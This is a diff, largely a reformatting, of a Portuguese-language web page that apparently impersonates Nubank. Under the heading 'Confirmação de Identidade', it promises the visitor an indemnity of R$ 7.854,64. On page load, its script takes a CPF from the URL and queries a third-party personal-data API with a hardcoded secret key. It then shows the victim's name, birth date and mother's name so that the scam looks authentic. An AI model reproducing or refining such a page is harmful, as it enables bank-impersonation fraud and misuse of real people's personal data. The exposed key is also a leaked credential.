@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
 
   <title>Confirmação de Identidade - Nubank</title>
   <style>
@@ -62,12 +62,20 @@
 <body>
 
   <div class="container">
-    <img class="logo" src="https://i.postimg.cc/X7JSyHqM/Captura-de-tela-2025-05-30-234638.png" alt="Nubank" width="100">
+    <img
+      class="logo"
+      src="https://i.postimg.cc/X7JSyHqM/Captura-de-tela-2025-05-30-234638.png"
+      alt="Nubank"
+      width="100"
+    />
 
     <div class="divider"></div>
 
     <div class="info-box">
-        <center> Sua identidade foi confirmada com sucesso! <br> Confira abaixo as informações cadastradas.<br></center>
+      <center>
+        Sua identidade foi confirmada com sucesso! <br />
+        Confira abaixo as informações cadastradas.<br />
+      </center>
     </div>
 
     <div class="info-box">
@@ -91,54 +99,56 @@
     </div>
 
     <div class="info-box">
-  <b>Indenização a receber</b>
-  <strong>R$ 7.854,64</strong>
-</div>
-
+      <b>Indenização a receber</b>
+      <strong>R$ 7.854,64</strong>
+    </div>
 
     <div class="divider"></div>
 
     <div class="footer">
-      Sistema de Verificação - Nubank<br>
+      Sistema de Verificação - Nubank<br />
       Santa Catarina
     </div>
   </div>
 
-<script>
-function buscarDados() {
-  const params = new URLSearchParams(window.location.search);
-  const cpf = params.get("cpf");
+  <script>
+    function buscarDados() {
+      const params = new URLSearchParams(window.location.search);
+      const cpf = params.get("cpf");
 
-  if (!cpf || cpf.length < 11) {
-    alert("CPF inválido ou não informado na URL.");
-    return;
-  }
+      if (!cpf || cpf.length < 11) {
+        alert("CPF inválido ou não informado na URL.");
+        return;
+      }
 
-  const urlDaAPI = `https://api.mytrust.space/v1/cpf/${cpf}`;
+      const urlDaAPI = `https://api.mytrust.space/v1/cpf/${cpf}`;
 
-  fetch(urlDaAPI, {
-    headers: {
-      "x-trust-key": "sk_01jvm86wy4yykgc5famr8wcepw01jvm86wy57enmmdvvmdpcbwfy"
+      fetch(urlDaAPI, {
+        headers: {
+          "x-trust-key":
+            "sk_01jvm86wy4yykgc5famr8wcepw01jvm86wy57enmmdvvmdpcbwfy",
+        },
+      })
+        .then((response) => response.json())
+        .then((dados) => {
+          console.log(dados);
+          if (dados && dados.dados && dados.dados.length > 0) {
+            document.getElementById("nome").innerText = dados.dados[0].NOME;
+            document.getElementById("cpf").innerText = dados.dados[0].CPF;
+            document.getElementById("nascimento").innerText = dados.dados[0].NASC;
+            document.getElementById("mae").innerText = dados.dados[0].NOME_MAE;
+          } else {
+            alert("Nenhum dado encontrado para esse CPF.");
+          }
+        })
+        .catch((error) => {
+          console.error("Erro ao buscar dados da API:", error);
+        });
     }
-  })
-  .then(response => response.json())
-  .then(dados => {
-    console.log(dados);
-    if (dados && dados.dados && dados.dados.length > 0) {
-      document.getElementById("nome").innerText = dados.dados[0].NOME;
-      document.getElementById("cpf").innerText = dados.dados[0].CPF;
-      document.getElementById("nascimento").innerText = dados.dados[0].NASC;
-      document.getElementById("mae").innerText = dados.dados[0].NOME_MAE;
-    } else {
-      alert("Nenhum dado encontrado para esse CPF.");
-    }
-  })
-  .catch(error => {
-    console.error("Erro ao buscar dados da API:", error);
-  });
-}
 
- buscarDados();
+    document.addEventListener("DOMContentLoaded", () => {
+      buscarDados();
+    });
   </script>
 </body>
 </html>
